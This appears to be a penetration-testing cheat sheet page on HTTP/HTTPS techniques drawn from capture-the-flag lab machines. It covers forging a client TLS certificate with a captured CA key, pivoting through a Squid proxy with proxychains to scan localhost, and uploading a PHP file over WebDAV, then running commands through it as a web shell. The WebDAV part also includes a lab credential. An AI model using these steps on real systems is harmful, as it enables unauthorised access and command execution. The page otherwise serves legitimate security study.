---
icon: globe-pointer
description: HyperText Transfer Protocol
---

# HTTP/HTTPS

{% hint style="info" %}
## <mark style="color:purple;">Generate a</mark> <mark style="color:orange;">`TLS`</mark> <mark style="color:purple;">Certificate</mark>

<mark style="color:orange;">**`With the CA private key already`**</mark>

1. <mark style="color:purple;">Verify Client Certificate Requirements:</mark>

```bash
openssl s_client -connect 10.10.10.131:443
```

2. <mark style="color:purple;">Generate the client's private key:</mark>

```bash
openssl genrsa -out client.key 4096
```

3. <mark style="color:purple;">Create a</mark> <mark style="color:orange;">**`certificate signing request (CSR)`**</mark> <mark style="color:purple;">, ensure the fields match the server's expectations:</mark>

```bash
openssl req -new -key client.key -out client.req
```

4. <mark style="color:purple;">Sign the</mark> <mark style="color:orange;">**`CSR`**</mark> <mark style="color:purple;">with the</mark> <mark style="color:orange;">**`CA’s private key`**</mark> <mark style="color:purple;">to issue a</mark> <mark style="color:orange;">**`client certificate`**</mark> <mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```bash
openssl x509 -req -in client.req -CA lacasadepapel-htb.pem -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
```
{% endcode %}

5. <mark style="color:purple;">Convert the private key and certificate into a</mark> <mark style="color:orange;">**`PKCS#12 (.p12)`**</mark> <mark style="color:purple;">format file for easy import:</mark>

```bash
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`Squid`</mark> <mark style="color:purple;">Proxy</mark>

* <mark style="color:purple;">The config file normally lives in</mark> <mark style="color:orange;">**`/etc/squid/squid.conf`**</mark>
* <mark style="color:purple;">Relays on</mark> <mark style="color:orange;">**`/usr/lib/squid/basic_ncsa_auth`**</mark> <mark style="color:purple;">for authentication and the program stores the passwords in</mark> <mark style="color:orange;">**`/etc/squid/passwords`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Check if you can reverse it to access the local network.</mark>
* <mark style="color:purple;">First add the address and port to the last line of your</mark> <mark style="color:orange;">**`proxychain.conf`**</mark> <mark style="color:purple;">file:</mark>

```
http 10.10.10.67 312
```

* <mark style="color:purple;">Then, just</mark> <mark style="color:orange;">**`nmap`**</mark> <mark style="color:purple;">the</mark> <mark style="color:orange;">**`localhost`**</mark><mark style="color:purple;">:</mark>

```sh
proxychains nmap -n -sT 127.0.0.1
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">**`WebDAV`**</mark>

_<mark style="color:purple;">**Web Distributed Authoring and Versioning**</mark>_<mark style="color:purple;">, an extension of the</mark> <mark style="color:orange;">**`HTTP`**</mark> <mark style="color:purple;">protocol that allows users to collaboratively edit and manage files stored on a remote server.</mark>

* <mark style="color:purple;">Extends HTTP methods like</mark> <mark style="color:orange;">**`GET`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`POST`**</mark> <mark style="color:purple;">with additional ones like</mark> <mark style="color:orange;">**`PROPFIND`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`PROPPATCH`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`MKCOL`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`DELETE`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`COPY`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`MOVE`**</mark><mark style="color:purple;">, and</mark> <mark style="color:orange;">**`LOCK`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Credentials can be found at</mark> <mark style="color:orange;">**`webdav.passwd`**</mark><mark style="color:purple;">**.**</mark>
* [<mark style="color:orange;">**`devtest`**</mark>](https://github.com/cldrn/davtest) <mark style="color:purple;">can be use for enumeration.</mark>

***

{% code title="Upload files" overflow="wrap" %}
```sh
curl --upload-file ./file.php --user <UserName>:<Password> http://10.10.10.67/webdav_test_inception/
```
{% endcode %}

{% code title="Run commands from revshell" overflow="wrap" %}
```sh
curl --data-urlencode 'cmd=id' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/file.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

{% code title="Enumeration" overflow="wrap" %}
```sh
davtest.pl -url http://10.10.10.67/webdav_test_inception -auth <UserName>:<Password>
```
{% endcode %}
{% endhint %}
